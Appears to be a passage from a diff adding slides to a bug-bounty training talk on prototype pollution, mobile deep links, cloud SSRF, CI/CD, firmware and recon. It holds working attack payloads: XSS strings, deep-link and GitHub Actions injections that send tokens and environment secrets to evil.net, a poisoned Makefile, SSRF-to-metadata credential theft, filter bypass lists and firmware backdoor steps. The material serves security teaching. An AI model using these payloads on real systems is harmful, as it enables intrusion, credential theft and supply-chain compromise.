+  <section>
+    <h3>Finding PP in the wild</h3>
+    <pre><code class="javascript" data-trim>
+// In DevTools console on the target:
+Object.prototype.polluted = "yes";
+
+// Then use the app. If ANYTHING breaks weirdly → there's a gadget.
+// If nothing breaks → try specific properties:
+Object.prototype.innerHTML = '&lt;img src=x onerror=alert(1)&gt;';
+Object.prototype.src = 'javascript:alert(1)';
+Object.prototype.srcdoc = '&lt;script&gt;alert(1)&lt;/script&gt;';
+
+// Refresh. Click things. Wait for the pop.
+    </code></pre>
+    <p class="tiny dim">Client-side PP → XSS. Server-side PP (Node) → RCE. Same bug.</p>
+  </section>
+
+  <section>
+    <h3>Go deeper</h3>
+    <table>
+      <tr><td><strong>Tool</strong></td><td>DOM Invader (Burp browser) — auto-finds sinks</td></tr>
+      <tr><td><strong>Tool</strong></td><td>PP-finder, protoscan for prototype pollution</td></tr>
+      <tr><td><strong>Read</strong></td><td>PortSwigger prototype pollution research series</td></tr>
+      <tr><td><strong>Hunt</strong></td><td>Browser extensions: unpack → <code>manifest.json</code> → <code>externally_connectable</code></td></tr>
+    </table>
+  </section>
+</section>
+
+<!-- ============================================================ -->
+<!-- 05 — MOBILE (EXTENDED)                                       -->
+<!-- ============================================================ -->
+<section>
+  <section data-background-color="#1a1a2e">
+    <h1><span class="accent">05</span> Mobile</h1>
+    <p><span class="tag owasp">M1 Credential Usage</span> <span class="tag owasp">M8 Misconfiguration</span> <span class="tag">Deep Links</span></p>
+  </section>
+
+  <section>
+    <h3>How to start — no phone needed</h3>
+    <pre><code class="bash" data-trim>
+# Get APK: apkpure.com, apkmirror, or `adb pull`
+# It's a zip file.
+
+unzip app.apk -d app/
+strings app/classes.dex | grep -iE "api_key|secret|password|firebase|aws" | sort -u
+strings app/classes.dex | grep -oE "https?://[a-zA-Z0-9./_-]+" | sort -u
+    </code></pre>
+    <p class="small dim">80% of mobile bugs = hardcoded strings. The other 20% = the API (see Area #02).</p>
+  </section>
+
+  <section>
+    <h3>Trick #1 — Firebase free-for-all</h3>
+    <pre><code class="bash" data-trim data-line-numbers="1-2|4-6|8-11">
+# Found in strings:
+https://myapp-prod.firebaseio.com
+
+# Try reading everything:
+curl https://myapp-prod.firebaseio.com/.json
+# → entire database. no auth.
+
+# Try writing:
+curl -X PUT https://myapp-prod.firebaseio.com/users/1.json \
+     -d '{"role":"admin","balance":999999}'
+# → 200 OK. Still. In 2026.
+    </code></pre>
+    <p class="tiny dim">Also check: <code>/.json?shallow=true</code> to list keys without dumping GB of data</p>
+  </section>
+
+  <section>
+    <h3>Trick #2 — Exported deep links</h3>
+    <p class="small">AndroidManifest.xml is a <span class="accent">public API contract</span></p>
+    <pre><code class="xml" data-trim data-line-numbers="1-8|2,5">
+&lt;activity android:name=".WebViewActivity"
+          android:exported="true"&gt;
+  &lt;intent-filter&gt;
+    &lt;data android:scheme="myapp"
+          android:host="open" /&gt;
+  &lt;/intent-filter&gt;
+&lt;/activity&gt;
+&lt;!-- Takes a "url" param → loads it in WebView with JS enabled --&gt;
+    </code></pre>
+    <div class="fragment">
+      <pre><code class="bash" data-trim>
+# Any app (or web page!) can trigger:
+adb shell am start "myapp://open?url=javascript:fetch('/api/token').then(r=>r.text()).then(t=>location='//evil.net/'+t)"
+      </code></pre>
+      <p class="tiny dim">The WebView has the app's cookies. The JavaScript has the WebView. You have everything.</p>
+    </div>
+  </section>
+
+  <section>
+    <h3 class="accent3">War story — TikTok</h3>
+    <div class="box story">
+      <strong>One of my TikTok findings.</strong><br><br>
+      Deep link handler → took a URL → loaded in internal WebView.<br>
+      URL validation: <code>url.contains("tiktok.com")</code><br><br>
+      My URL: <code class="accent3">https://evil.net/?tiktok.com</code><br><br>
+      WebView loads my page. WebView has <code>addJavascriptInterface</code> exposing native methods. My JS calls native methods. Native methods include "get auth token."<br><br>
+      <span class="dim">One deep link, sent via any channel (SMS, web, another app) → full account takeover. No user interaction beyond tapping a link.</span>
+    </div>
+    <aside class="notes">
+      Redacted/simplified but this is the shape of a LOT of mobile bugs.
+      The attack surface isn't the app. It's the SEAMS between app and OS.
+    </aside>
+  </section>
+
+  <section>
+    <h3 class="accent3">Bonus — deep link straight to the cloud</h3>
+    <div class="box story">
+      <strong>Different app. Same seam. Paid 10.0.</strong><br><br>
+      <code>myapp://download?file=&lt;guid&gt;</code> → fetch file from backend by GUID.<br><br>
+      GUID not found? The handler had a fallback: treat the param as a URL and fetch it directly. Convenience code. Never meant to ship.<br><br>
+      <code class="accent3">myapp://download?file=http://169.254.169.254/latest/meta-data/iam/security-credentials/</code><br><br>
+      App runs on EC2. Fetches metadata. Returns AWS creds as the "download."<br><br>
+      <span class="dim">Mobile bug → cloud compromise. The app was the SSRF proxy. One tap on a link.</span>
+    </div>
+    <aside class="notes">
+      This is why I keep saying the areas bleed into each other. This is
+      a mobile finding that's actually a cloud finding that's actually
+      a code-review finding (the fallback branch). Category is for the report.
+      The bug doesn't care.
+    </aside>
+  </section>
+
+  <section>
+    <h3>jadx search cheatsheet</h3>
+    <pre><code class="text" data-trim>
+Search for...              To find...
+─────────────────────────────────────────────────────────────
+"http://"                  Cleartext traffic (should be https)
+TrustManager               Cert pinning — or cert pinning DISABLED
+checkServerTrusted         Empty implementation = accepts all certs
+SharedPreferences          Local secret storage (often unencrypted)
+MODE_WORLD_READABLE        Files any app can read (deprecated but...)
+addJavascriptInterface     WebView → native bridge (dangerous)
+loadUrl                    WebView sinks
+android:exported="true"    Attack surface from other apps
+Runtime.exec               Command injection on-device
+    </code></pre>
+  </section>
+
+  <section>
+    <h3>Go deeper</h3>
+    <table>
+      <tr><td><strong>Static</strong></td><td>jadx, apktool, MobSF (all-in-one scanner)</td></tr>
+      <tr><td><strong>Dynamic</strong></td><td>Frida + objection (bypass pinning in 1 command)</td></tr>
+      <tr><td><strong>Read</strong></td><td>OWASP MASTG — the mobile testing bible</td></tr>
+      <tr><td><strong>Practice</strong></td><td>InsecureBankv2, UnCrackable series, DIVA</td></tr>
+    </table>
+  </section>
+</section>
+
+<!-- ============================================================ -->
+<!-- 06 — CLOUD (EXTENDED + LIVE DEMO)                            -->
+<!-- ============================================================ -->
+<section>
+  <section data-background-color="#1a1a2e">
+    <h1><span class="accent">06</span> Cloud</h1>
+    <p><span class="tag owasp">A05 Misconfiguration</span> <span class="tag owasp">A10 SSRF</span> <span class="tag live">LIVE DEMO</span></p>
+  </section>
+
+  <section>
+    <h3>How to start</h3>
+    <div class="box">
+      From the outside, cloud = <span class="accent">SSRF + misconfig</span>.<br><br>
+      Find any feature that fetches a URL on your behalf:<br>
+      <span class="small">webhooks · "import from URL" · PDF/image generators · link previews · SSO/SAML · integration tests</span><br><br>
+      Point it at the metadata service. See what comes back.
+    </div>
+  </section>
+
+  <section>
+    <h3>Know your metadata endpoints</h3>
+    <table class="small">
+      <tr><th>Cloud</th><th>Endpoint</th><th>Gotcha</th></tr>
+      <tr><td>AWS</td><td><code>169.254.169.254/latest/meta-data/</code></td><td>IMDSv2 needs PUT token</td></tr>
+      <tr><td>GCP</td><td><code>metadata.google.internal/...</code></td><td>Needs <code>Metadata-Flavor: Google</code> header</td></tr>
+      <tr><td>Azure</td><td><code>169.254.169.254/metadata/...</code></td><td>Needs <code>Metadata: true</code> header</td></tr>
+      <tr><td>DigitalOcean</td><td><code>169.254.169.254/metadata/v1/</code></td><td>No protection 🎉</td></tr>
+      <tr><td>Alibaba</td><td><code>100.100.100.200/latest/meta-data/</code></td><td>Different IP!</td></tr>
+      <tr><td>Kubernetes</td><td><code>kubernetes.default.svc/...</code></td><td>ServiceAccount token in <code>/var/run/secrets/</code></td></tr>
+    </table>
+  </section>
+
+  <section>
+    <h3>Trick #1 — SSRF → IMDS chain</h3>
+    <pre><code class="http" data-trim data-line-numbers="1-3|5-6|8-12">
+POST /api/webhook-test HTTP/1.1
+Content-Type: application/json
+{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
+
+← "Error fetching webhook: ec2-web-role"
+   (role name leaked in error — we're in business)
+
+{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-web-role"}
+
+← "Error fetching webhook: {\"AccessKeyId\":\"ASIA...\",
+   \"SecretAccessKey\":\"wJa...\", \"Token\":\"IQoJ...\"}"
+    </code></pre>
+    <p class="tiny dim fragment">The error message is the exfil channel. This is the automotive cloud bug from my DEF CON talk.</p>
+  </section>
+
+  <section>
+    <h3>Trick #2 — What to do with the creds</h3>
+    <p class="small">You got <code>ASIA...</code> keys. Now what? <span class="accent">Don't just run <code>aws s3 ls</code>.</span></p>
+    <pre><code class="bash" data-trim data-line-numbers="1-3|5-6|8-10|12-14">
+export AWS_ACCESS_KEY_ID=ASIA...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...
+
+# Who am I? (this call isn't logged in CloudTrail by default 😈)
+aws sts get-caller-identity
+
+# What can I actually do? Don't guess — enumerate.
+aws iam list-attached-role-policies --role-name ec2-web-role
+aws iam get-role-policy --role-name ec2-web-role --policy-name inline-policy
+
+# Common wins:
+aws secretsmanager list-secrets        # jackpot #1
+aws ssm get-parameters-by-path --path / --with-decryption  # jackpot #2
+    </code></pre>
+  </section>
+
+  <section data-background-color="#2a1a00">
+    <h2><span class="accent3">⚡ LIVE DEMO</span></h2>
+    <p class="small">
+      SSRF on flaws.cloud Level 5 → IMDS → creds → S3 bucket of the next level<br><br>
+      <span class="dim">The whole chain, start to finish, ~4 min</span>
+    </p>
+    <div class="box warn small">
+      <strong>Demo notes:</strong><br>
+      1. Show the proxy: <code>http://4d0cf...flaws.cloud/proxy/google.com</code><br>
+      2. Swap for <code>169.254.169.254/latest/meta-data/</code><br>
+      3. Walk to <code>iam/security-credentials/flaws</code><br>
+      4. Export creds in terminal<br>
+      5. <code>aws s3 ls --profile flaws</code> → show the level6 bucket<br>
+      6. Pause — explain why this was ONE bug but FULL compromise
+    </div>
+  </section>
+
+  <section>
+    <h3>SSRF filter bypasses — the hits</h3>
+    <pre><code class="text" data-trim>
+Blocked: 169.254.169.254
+─────────────────────────────────────────
+169.254.169.254.nip.io       ← DNS resolves to the IP
+0xA9FEA9FE                   ← hex encoding
+2852039166                   ← decimal encoding
+0251.0376.0251.0376          ← octal
+[::ffff:169.254.169.254]     ← IPv6-mapped IPv4
+169.254.169.254:80@evil.com  ← URL parser confusion
+http://evil.com → 302 → 169.254.169.254  ← redirect after check
+metadata.google.internal     ← GCP — it's a hostname, not an IP
+    </code></pre>
+  </section>
+
+  <section>
+    <h3>Go deeper</h3>
+    <table>
+      <tr><td><strong>Practice</strong></td><td>flaws.cloud, flaws2.cloud, CloudGoat, pwnedlabs.io</td></tr>
+      <tr><td><strong>Tool</strong></td><td>Pacu (AWS exploitation), enumerate-iam, cloudfox</td></tr>
+      <tr><td><strong>Read</strong></td><td>hackingthe.cloud — the wiki for all of this</td></tr>
+      <tr><td><strong>Build</strong></td><td>Your own AWS free tier → misconfigure it → attack yourself</td></tr>
+    </table>
+  </section>
+</section>
+
+<!-- ============================================================ -->
+<!-- 07 — CI/CD (EXTENDED)                                        -->
+<!-- ============================================================ -->
+<section>
+  <section data-background-color="#1a1a2e">
+    <h1><span class="accent">07</span> CI/CD & Supply Chain</h1>
+    <p><span class="tag owasp">A08 Software & Data Integrity</span></p>
+    <p class="dim tiny">my love language</p>
+  </section>
+
+  <section>
+    <h3>Why this area is different</h3>
+    <blockquote class="small">
+      The pipeline has <span class="accent">more privileges than any human at the company.</span><br><br>
+      It can: push to prod · read every secret · assume IAM roles · sign releases · deploy infrastructure.<br><br>
+      And it runs <span class="accent2">code from pull requests.</span>
+    </blockquote>
+  </section>
+
+  <section>
+    <h3>How to start</h3>
+    <div class="box">
+      Read <code>.github/workflows/*.yml</code> in any public repo. Look for:<br><br>
+      <table class="tiny" style="width:100%">
+        <tr><td><code>pull_request_target</code></td><td>→ runs with write token on forked PR code</td></tr>
+        <tr><td><code>${{ github.event.* }}</code> in <code>run:</code></td><td>→ shell injection via issue/PR fields</td></tr>
+        <tr><td><code>actions/checkout</code> + <code>ref:</code> user input</td><td>→ checks out attacker code</td></tr>
+        <tr><td><code>secrets.*</code> → untrusted action</td><td>→ third-party steals your secret</td></tr>
+        <tr><td><code>GITHUB_TOKEN</code> with <code>permissions:</code> unset</td><td>→ default = write-all (on old repos)</td></tr>
+      </table>
+    </div>
+  </section>
+
+  <section>
+    <h3>Trick #1 — Expression injection</h3>
+    <pre><code class="yaml" data-trim data-line-numbers="1-7|6">
+# .github/workflows/label-issue.yml
+on: issues
+jobs:
+  triage:
+    steps:
+      - run: echo "New issue: ${{ github.event.issue.title }}"
+    </code></pre>
+    <div class="fragment">
+      <pre><code class="text" data-trim>
+Issue title: x"; curl -d "$(env)" evil.net; echo "
+
+Shell receives:
+echo "New issue: x"; curl -d "$(env)" evil.net; echo ""
+                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                    every secret in the runner environment
+      </code></pre>
+    </div>
+    <aside class="notes">
+      GitHub expressions are expanded BEFORE the shell sees them.
+      It's not a variable. It's literal string substitution. Into bash.
+    </aside>
+  </section>
+
+  <section>
+    <h3>Trick #2 — Poisoned Pipeline Execution (PPE)</h3>
+    <p class="small">You can't edit the pipeline. But the pipeline <span class="accent">runs things you CAN edit.</span></p>
+    <pre><code class="yaml" data-trim data-line-numbers="1-6|5">
+# Jenkinsfile — protected, you can't touch it
+pipeline {
+  stages {
+    stage('Build') {
+      steps { sh 'make build' }    ← runs Makefile
+    } } }
+    </code></pre>
+    <div class="fragment">
+    <pre><code class="makefile" data-trim>
+# Makefile — NOT protected, it's "just code"
+build:
+    @curl -d "$$(env | base64)" https://evil.net/
+    @gcc -o app main.c   # still build, nobody notices
+    </code></pre>
+    <p class="tiny dim">Also works via: package.json scripts · setup.py · gradle tasks · terraform external data · pre-commit hooks</p>
+    </div>
+  </section>
+
+  <section>
+    <h3 class="accent3">War story — the flag that lied</h3>
+    <div class="box story">
+      <strong>Paid 8.9. This one hurt the defenders.</strong><br><br>
+      CI pipeline ran: <code class="accent3">npm ci --ignore-scripts</code><br>
+      Safe, right? No install scripts = no RCE from a malicious PR.<br><br>
+      My PR added one file: <code>.npmrc</code><br>
+      <code>onload-script=./pwn.js</code><br><br>
+      <code>--ignore-scripts</code> blocks <code>preinstall</code>/<code>postinstall</code>.<br>
+      It does <span class="accent3">not</span> block <code>onload-script</code>. Different mechanism. Undocumented.<br><br>
+      <span class="dim">Runner executed my JS with full env. AWS keys, GitHub token, everything. The defense was correct. The assumption wasn't.</span>
+    </div>
+    <aside class="notes">
+      This is my favorite kind of bug. The defender did everything right
+      according to the docs. The docs were incomplete. Read the SOURCE of
+      your security controls, not just the README.
+      Variant: .npmrc with git= override → npm runs YOUR git binary on git deps.
+    </aside>
+  </section>
+
+  <section>
+    <h3>Artifact poisoning — the sneaky one</h3>
+    <pre><code class="yaml" data-trim data-line-numbers="1-8|10-17">
+# Workflow A — runs on pull_request (UNTRUSTED, no secrets)
+on: pull_request
+jobs:
+  build:
+    steps:
+      - run: ./build.sh              # ← attacker controls this
+      - uses: actions/upload-artifact
+        with: { name: dist, path: ./dist }
+
+# Workflow B — runs on workflow_run (TRUSTED, has secrets!)
+on:
+  workflow_run:
+    workflows: ["Build"]
+jobs:
+  deploy:
+    steps:
+      - uses: actions/download-artifact   # ← downloads attacker's output
+      - run: ./dist/deploy.sh             # ← 💀 runs attacker's script with prod creds
+    </code></pre>
+  </section>
+
+  <section>
+    <h3>Go deeper</h3>
+    <table>
+      <tr><td><strong>Practice</strong></td><td>CI/CD Goat — 11 challenges, Jenkins + Gitea, our team built it</td></tr>
+      <tr><td><strong>Read</strong></td><td>OWASP CI/CD Top 10 · "Top 10 CI/CD Security Risks" (Cider)</td></tr>
+      <tr><td><strong>Tool</strong></td><td><code>zizmor</code> — static analysis for GitHub Actions</td></tr>
+      <tr><td><strong>Hunt</strong></td><td>GitHub code search: <code>pull_request_target path:.github</code></td></tr>
+    </table>
+  </section>
+</section>
+
+<!-- ============================================================ -->
+<!-- 08 — IoT (EXTENDED)                                          -->
+<!-- ============================================================ -->
+<section>
+  <section data-background-color="#1a1a2e">
+    <h1><span class="accent">08</span> IoT & Firmware</h1>
+    <p><span class="tag owasp">A05 Misconfig</span> <span class="tag">Hardcoded Creds</span> <span class="tag">Debug Interfaces</span></p>
+  </section>
+
+  <section>
+    <h3>How to start — no hardware</h3>
+    <pre><code class="bash" data-trim>
+# 1. Download firmware from vendor support page
+#    (search "<device model> firmware download")
+# 2. Extract
+binwalk -e firmware.bin
+# 3. You now have a Linux filesystem. Treat it like Source Code (#09).
+cd _firmware.bin.extracted/squashfs-root/
+    </code></pre>
+    <p class="small dim">If <code>binwalk -e</code> fails: try <code>unblob</code>. It's newer and smarter.</p>
+  </section>
+
+  <section>
+    <h3>The firmware grep checklist</h3>
+    <pre><code class="bash" data-trim data-line-numbers="1-2|4-5|7-8|10-11|13-14|16-17">
+# Credentials
+cat etc/shadow etc/passwd      # hash? crack it. empty? walk in.
+
+# Hardcoded secrets
+grep -rn "PRIVATE KEY\|password\|passwd\|secret" etc/ usr/
+
+# Debug services left on
+grep -rn "telnetd\|utelnetd\|dropbear\|gdbserver" etc/init.d/
+
+# Web admin panel (usually PHP or Lua CGI from 2009)
+find . -path "*/www/*" -name "*.php" -o -name "*.cgi" -o -name "*.lua"
+
+# Update mechanism — can you push your own firmware?
+grep -rn "wget\|curl\|http://\|fwupdate\|upgrade" etc/ sbin/
+
+# Certificate validation (spoiler: often no)
+grep -rn "verify.*false\|VERIFY_NONE\|-k\|--insecure"
+    </code></pre>
+  </section>
+
+  <section>
+    <h3>Trick #1 — The debug port they forgot</h3>
+    <pre><code class="bash" data-trim>
+# In firmware:
+cat etc/init.d/S99debug
+→ #!/bin/sh
+  telnetd -l /bin/sh -p 2323   # "TODO: remove before shipping"
+
+# On device:
+nc 192.168.1.1 2323
+→ BusyBox v1.20.2 built-in shell (ash)
+  / # id
+  uid=0(root) gid=0(root)
+    </code></pre>
+    <p class="tiny dim">"We'll remove it before shipping" — words carved on the tombstone of IoT security</p>
+  </section>
+
+  <section>
+    <h3>Trick #2 — Unsigned firmware updates</h3>
+    <pre><code class="bash" data-trim data-line-numbers="1-4|6-10|12-15">
+# Found in /sbin/fwupdate.sh:
+wget http://update.vendor.com/latest.bin -O /tmp/fw.bin
+# ← no HTTPS. no signature check. no hash verification.
+flash_write /tmp/fw.bin
+
+# Attack 1 — ARP spoof on the local network:
+arpspoof -t <device> <gateway>
+# serve your firmware at update.vendor.com
+# device flashes your rootkit on next update check
+
+# Attack 2 — the web admin panel has an "upload firmware" button
+# and it ALSO doesn't verify signatures
+# upload firmware.bin with your own /etc/init.d/S99backdoor
+    </code></pre>
+  </section>
+
+  <section>
+    <h3 class="accent3">War story — Automotive</h3>
+    <div class="box story">
+      <strong>Telematics unit in a production vehicle.</strong><br><br>
+      Firmware download from OEM portal → binwalk → squashfs.<br><br>
+      <code>/etc/ppp/chap-secrets</code> had the <span class="accent3">APN credentials for the private cellular network</span> every vehicle in the fleet used.<br><br>
+      Same file. Same creds. Every car.<br><br>
+      <span class="dim">One firmware dump → lateral access to the entire fleet's private network. From there → telematics backend → the cloud stuff from Area #06. One file. Millions of cars.</span>
+    </div>
+    <aside class="notes">
+      This is why I got into automotive. The blast radius is insane.
+      Also why I did the DEF CON talk — people need to know this is real.
+    </aside>
+  </section>
+
+  <section>
+    <h3>Hardware — the $15 starter kit</h3>
+    <div class="cols small">
+      <div class="col box">
+        <strong class="accent">Buy:</strong><br>
+        • USB-UART (CP2102 or FT232) — $3<br>
+        • Jumper wires — $2<br>
+        • Multimeter — $10<br><br>
+        <span class="dim">That's it. That's the kit.</span>
+      </div>
+      <div class="col box">
+        <strong class="accent">Find UART on the board:</strong><br>
+        • 4 pins/pads in a row<br>
+        • Often labeled TX RX GND VCC<br>
+        • Not labeled? → multimeter: GND=continuity to shield, VCC=3.3V steady, TX=fluctuates on boot<br>
+        • <code>screen /dev/ttyUSB0 115200</code><br>
+        • Watch boot → often drops to root shell
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h3>Go deeper</h3>
+    <table>
+      <tr><td><strong>Extract</strong></td><td>binwalk, unblob, firmware-mod-kit</td></tr>
+      <tr><td><strong>Analyze</strong></td><td>Ghidra (free!), firmwalker, EMBA</td></tr>
+      <tr><td><strong>Emulate</strong></td><td>QEMU + firmadyne — run firmware without hardware</td></tr>
+      <tr><td><strong>Practice</strong></td><td>IoTGoat, DVRF, any $20 router from eBay</td></tr>
+      <tr><td><strong>Read</strong></td><td>OWASP FSTM (Firmware Security Testing Methodology)</td></tr>
+    </table>
+  </section>
+</section>
+
+<!-- ============================================================ -->
+<!-- 09 — SOURCE CODE (EXTENDED + LIVE DEMO)                      -->
+<!-- ============================================================ -->
+<section>
+  <section data-background-color="#1a1a2e">
+    <h1><span class="accent">09</span> Source Code Analysis</h1>
+    <p><span class="tag">Sources & Sinks</span> <span class="tag">The Cheat Code</span> <span class="tag live">LIVE DEMO</span></p>
+  </section>
+
+  <section>
+    <h3>The mental model</h3>
+    <div class="cols">
+      <div class="col box">
+        <strong class="accent">Sources</strong> — where attacker data enters<br><br>
+        <code class="tiny">req.body · req.query · req.params · req.headers · process.argv · os.environ · file reads · DB reads of user data · message queue payloads</code>
+      </div>
+      <div class="col box warn">
+        <strong class="accent2">Sinks</strong> — where data does damage<br><br>
+        <code class="tiny">eval · exec · query · innerHTML · system · deserialize · open/readFile · redirect · res.send · template render</code>
+      </div>
+    </div>
+    <p class="small fragment">Bug = <span class="accent">source</span> reaches <span class="accent2">sink</span> without sanitization in between.</p>
+  </section>
+
+  <section>
+    <h3>Trick #1 — grep IS a SAST tool</h3>
+    <pre><code class="bash" data-trim data-line-numbers="1-2|4-5|7-8|10-11|13-14|16-17">
+# SQLi — string concat into queries
+grep -rn "query.*+\|query.*\${" --include="*.js" --include="*.py"
+
+# Command injection
+grep -rn "exec\|spawn\|system\|popen\|shell=True\|Runtime.getRuntime"
+
+# Deserialization
+grep -rn "pickle.loads\|yaml.load(\|unserialize\|readObject\|Marshal.load"
+
+# SSRF
+grep -rn "requests.get\|urllib\|http.get\|axios.get\|fetch(" | grep -i "req\.\|request\.\|params"
+
+# Path traversal
+grep -rn "open(\|readFile\|sendFile\|render(" | grep -i "req\.\|params\|query"
+
+# Secrets (git history too!)
+git log --all -p | grep -iE "AKIA|sk_live|BEGIN.*PRIVATE|password.*="
+    </code></pre>
+  </section>
+
+  <section>
+    <h3>Trick #2 — Read the tests</h3>
+    <blockquote class="small">
+      Tests are <span class="accent">documentation of what the dev thought could happen.</span><br>
+      Bugs are what they <em>didn't</em> think could happen.
+    </blockquote>
+    <div class="fragment">
+    <pre><code class="python" data-trim data-line-numbers="1-5|7-9">
+# tests/test_export.py
+def test_export_pdf():
+    assert export(format="pdf") == ...
+def test_export_csv():
+    assert export(format="csv") == ...
+
+# No test for: format="../../etc/passwd"
+# No test for: format=""
+# No test for: format=["pdf","csv"]
+    </code></pre>
+    <p class="tiny dim">The gaps in the test suite are a map of the attack surface.</p>
+    </div>
+  </section>
+
+  <section data-background-color="#2a1a00">
+    <h2><span class="accent3">⚡ LIVE DEMO</span></h2>
+    <p class="small">
+      Find a real bug in an open-source project with grep. Live. No net.<br><br>
+      <span class="dim">Target: a deliberately stale fork of a popular npm package</span>
+    </p>
+    <div class="box warn small">
+      <strong>Demo target:</strong> <code>assets/demo-grep/app.js</code> (47 lines, runs on :3001)<br><br>
+      1. <code>grep -n "exec\|spawn\|eval" app.js</code> → hit on line 20<br>
+      2. Show line 19: <code>`convert ${file} -resize ${width}x`</code> — template literal, no escaping<br>
+      3. Trace back: <code>width = q.width</code> ← <code>url.parse(req.url).query</code><br>
+      4. Source → sink, nothing between. That's the bug.<br>
+      5. <code>curl 'localhost:3001/resize?width=1;id&gt;%262;&amp;file=x'</code><br>
+      6. <code>uid=501...</code> in the error output → pause → let it land<br><br>
+      <span class="dim">Full runbook: <code>assets/demo-grep/README.md</code>. Tested. Works.</span>
+    </div>
+  </section>
+
+  <section>
+    <h3 class="accent3">The Elementor story — full version</h3>
+    <div class="timeline">
+      <div><strong>Day 0:</strong> Testing a client's WordPress site. Elementor page builder installed. Notice URL hash does… something to the page. Weird. Add to <code>weird.md</code>.</div>
+      <div class="fragment"><strong>Day 14:</strong> Slow Friday. Open <code>weird.md</code>. Remember the hash thing.</div>
+      <div class="fragment"><strong>+10 min:</strong> Download Elementor plugin zip. Grep for <code>location.hash</code>.</div>
+      <div class="fragment"><strong>+20 min:</strong> Find it: <code>hash</code> → <code>decodeURIComponent</code> → <code>settings</code> object → jQuery <code>$el.html(settings.something)</code>. No sanitizer.</div>
+      <div class="fragment"><strong>+40 min:</strong> Working payload. Then realize: <span class="accent3">this runs on every Elementor page. 6M+ sites.</span></div>
+      <div class="fragment"><strong>+2 hr:</strong> Report sent. <strong class="accent">CVE-2022-29455.</strong></div>
+    </div>
+    <p class="tiny dim fragment">The bug sat in my list for 2 weeks. The exploitation took 2 hours. The list is everything.</p>
+  </section>
+
+  <section>
+    <h3>Go deeper</h3>
+    <table>
+      <tr><td><strong>Tool</strong></td><td>Semgrep — grep that understands code structure. Free rules at semgrep.dev/r</td></tr>
+      <tr><td><strong>Tool</strong></td><td>CodeQL — query bug classes across codebases. Steep curve, huge payoff</td></tr>
+      <tr><td><strong>Tool</strong></td><td>weggli — like grep but for C/C++ ASTs (Google)</td></tr>
+      <tr><td><strong>Read</strong></td><td>"The Art of Software Security Assessment" (Dowd/McDonald/Schuh) — old, still the best</td></tr>
+    </table>
+  </section>
+</section>
+
+<!-- ============================================================ -->
+<!-- 10 — RECON (EXTENDED)                                        -->
+<!-- ============================================================ -->
+<section>
+  <section data-background-color="#1a1a2e">
+    <h1><span class="accent">10</span> Recon</h1>
+    <p><span class="tag">Attack Surface</span> <span class="tag">OSINT</span> <span class="tag">Asset Discovery</span></p>
+  </section>
+
+  <section>
+    <h3>The core insight</h3>
+    <blockquote>
+      The bug is in the asset <span class="accent">they forgot they own.</span><br><br>
+      <span class="small dim">Main app = 10 pentests a year, WAF, bug bounty, monitoring.<br>
+      Staging server from the 2019 acquisition = root:root.</span>
+    </blockquote>
+  </section>
+
+  <section>
+    <h3>Trick #1 — JS files are sitemaps</h3>
+    <pre><code class="bash" data-trim>
+# Download the main bundle
+curl -s https://app.target.com/main.js > main.js
+
+# Extract paths
+grep -oE '"/[a-zA-Z0-9_/\.-]+"' main.js | tr -d '"' | sort -u
+
+# Extract full URLs (third parties, internal APIs, S3 buckets)
+grep -oE 'https?://[a-zA-Z0-9._/-]+' main.js | sort -u
+
+# Extract the spicy stuff
+grep -iE 'api[_-]?key|secret|token|password|aws|firebase' main.js
+    </code></pre>
+    <p class="small fragment">Frontend devs hardcode <span class="accent">everything</span>. Including routes that have no button.</p>
+  </section>
+
+  <section>
+    <h3>Trick #2 — Wayback is a time machine for bugs</h3>
+    <pre><code class="bash" data-trim data-line-numbers="1-3|5-8|10-13">
+# Every URL archive.org ever saw for this domain
+echo target.com | waybackurls > urls.txt
+wc -l urls.txt   # often 50,000+ URLs
+
+# The gold:
+grep -iE "\.env|\.git|\.bak|backup|\.sql|\.zip|config" urls.txt
+grep -iE "api_key|token|secret|password" urls.txt
+grep -iE "/api/v1/" urls.txt   # old API versions — often still live, less auth
+
+# Check if they're still alive (many are)
+cat urls.txt | httpx -silent -status-code -title | grep 200
+    </code></pre>
+    <p class="tiny dim">Endpoint deprecated in 2021? Still responding in 2026. With the old auth logic.</p>
+  </section>
+
+  <section>
+    <h3>The permutation game</h3>
+    <pre><code class="text" data-trim>
+Known: app.target.com
+
+Generate:
+  {dev,test,stage,staging,qa,uat,demo,preprod,beta}.target.com
+  app-{dev,staging,test}.target.com
+  {dev,staging}-app.target.com
+  app.{dev,staging,internal,corp}.target.com
+  app{1,2,01,02}.target.com
+  old-app.target.com, new-app.target.com, legacy-app.target.com
+
+Resolve all → probe what's alive → screenshot → eyeball the weird ones
+    </code></pre>
+    <p class="tiny dim">Tools: <code>dnsgen</code>, <code>altdns</code>, <code>gotator</code> — all do this automatically</p>
+  </section>
+
+  <section>
+    <h3>The "always try" list</h3>
+    <p class="small dim">Paths that paid me. Repeatedly. Just… try them.</p>
+    <pre><code class="text" data-trim>
+/actuator/prometheus       ← 6+ hits. Leaks every endpoint + call count.
+/actuator/env              ← env vars. Sometimes includes secrets.
+/actuator/heapdump         ← download the JVM heap. grep for passwords.
+/metrics                   ← same idea, non-Spring
+/config.json               ← SPAs love leaving this. Client secrets inside.
+/assets/config/config.dev.json   ← the one they forgot to delete
+/.git/config               ← repo URL → sometimes with embedded creds
+/?debug=true               ← 5+ hits. You'd think this wouldn't work.
+/?debug=layout             ← CMS-specific but common
+/swagger-ui.html           ← the API spec they forgot was public
+    </code></pre>
+    <p class="tiny dim">None of these are clever. That's why they work.</p>
+  </section>
+
+  <section>
+    <h3 class="accent3">War story — The acquisition</h3>
+    <div class="box story">
+      <strong>Big tech company. Hardened main product.</strong><br><br>
+      Crunchbase → they acquired a startup 18 months ago.<br>
+      Startup's old domain? Still resolving.<br>
+      <code class="accent3">admin.oldstartup.com</code> → Django admin, <code>DEBUG=True</code>.<br><br>
+      Stack trace exposed DB connection string.<br>
+      DB was the <span class="accent3">same RDS instance</span> now backing the parent company's product.<br><br>
+      <span class="dim">The acquisition integrated the data. Nobody integrated the security.</span>
+    </div>
+    <aside class="notes">
+      Acquisitions are a goldmine. M&A teams migrate users, migrate data,
+      migrate revenue. Security migration is a "Q3 priority" that becomes Q4
+      that becomes never. Meanwhile the old infra is on the same VPC as the
+      new stuff.
+
